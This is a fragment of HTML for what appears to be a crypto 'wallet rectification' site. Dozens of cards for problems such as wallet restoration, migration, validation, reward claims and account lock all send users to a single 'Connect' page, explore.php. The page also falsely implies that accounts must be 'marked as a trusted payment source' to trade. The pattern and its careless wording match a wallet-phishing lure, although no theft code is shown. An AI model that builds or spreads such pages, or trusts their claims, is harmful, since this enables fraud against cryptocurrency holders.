                    ...
                    <div class="col-xl-5 col-lg-6 col-12">
                        <div class="intro-content  my-5">
                            ...
                            <div class="intro-btn mt-5">
                                <a class="btn btn-primary" href="explore.php">Connect<i class="bi bi-arrow-right"></i>
                                </a>
                ...
                <div class="col-xl-3 col-lg-6 col-md-6">
                    <div class="card"><img class="img-fluid card-img-top" src="images/items/1.jpg" alt="">
                        <div class="card-body">
                            ...
                            <p>Make your offers before 12pm EST Nov 29th</p><a href="explore.php">Explore<i class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-xl-3 col-lg-6 col-md-6">
                    <div class="card"><img class="img-fluid card-img-top" src="images/items/2.jpg" alt="">
                        <div class="card-body">
                            ...
                            <p>50 1/1's from Roger Allan Cleaves around the world</p><a href="explore.php">Explore<i class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-xl-3 col-lg-6 col-md-6">
                    <div class="card"><img class="img-fluid card-img-top" src="images/items/3.jpg" alt="">
                        <div class="card-body">
                            ...
                            <p>A collection of 100 1/1 Extra Dimensional Beings</p><a href="explore.php">Explore<i class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-xl-3 col-lg-6 col-md-6">
                    ...
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Lost access to your cryptocurrency wallet? We specialize in wallet restoration, allowing
                                you to regain control of your digital assets.</p><a href="explore.php">Explore<i
                    ...
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Resolve issues related to airdrops, ensuring accurate distribution and reception of
                                tokens during airdrop events.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                    ...
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Develop and maintain token bridges, enabling seamless transfers and interoperability
                                between different blockchain networks.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                    ...
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Assist in the creation, management, and troubleshooting of NFTs, ensuring a smooth
                                experience in the NFT marketplace.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
            ...
            <div class="row align-items-center">
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Buy and sell tokens and coin on discount.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Click here for APR activation.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            <h4>Staking</h4>
                            <p>Click here to stake tokens.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Click here to connect to DAPPS.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
            ...
            <div class="row align-items-center">
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            <h4>MIGRATION </h4>
                            <p>Click here for wallet transfer.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Click here for transaction delay issues.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Click here to fix inability to buy coins.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            <h4>TOKEN BRIDGE</h4>
                            <p>Click here for toekn bridge.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                    ...
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Optimize swap functionality within decentralized exchanges (DEXs) for improved speed,
                                accuracy, and user satisfaction.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                    ...
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Address liquidity challenges affecting buy and sell actions, ensuring a balanced and
                                smooth liquidity provision within trading platforms.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                    ...
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Optimize deposit and withdrawal processes to enhance user experience and streamline fund
                                transfers securely.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                    ...
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Implement strategies to minimize slippage, providing users with more predictable and
                                cost-effective trades.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
            ...
            <div class="row align-items-center">
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Click here for general related issues.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            <h4>Rectification</h4>
                            <p>Click here to rectify issues.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            <h4>Buy and Sell</h4>
                            <p>Click here for to buy and sell tokens.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            <h4>High Gas Fees</h4>
                            <p>Click here for gas fee related issues.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
            ...
            <div class="row align-items-center">
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            <h4>Claim Reward </h4>
                            <p>Click here for reward related issues.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            <h4>Validation</h4>
                            <p>click here for Validation related issues.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Click here for slippage related error during trade.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Click here for transaction related issues.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                ...
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Click here for issues related to account lock.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                    ...
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>Click here if you have problem with your trading
                                wallet.</p><a href="explore.php">Explore<i class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 col-md-6">
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>To trade crypto your account must be marked as a
                                trusted payment source.</p><a href="explore.php">Explore<i
                                    class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
                    ...
                    <div class="create-sell-content">
                        ...
                        <div>
                            ...
                            <p>If you can't find the issue you are experiencing click
                                here.</p><a href="explore.php">Explore<i class="bi bi-arrow-right-short"></i></a>
                        </div>
                    </div>
                </div>
            </div>
        ...
        <div class="container">
            ...
            <div class="row justify-content-center">
                <div class="col-xl-8">
                    ...
                    <div class="intro-video-content text-center mt-5"><a href="explore.php"
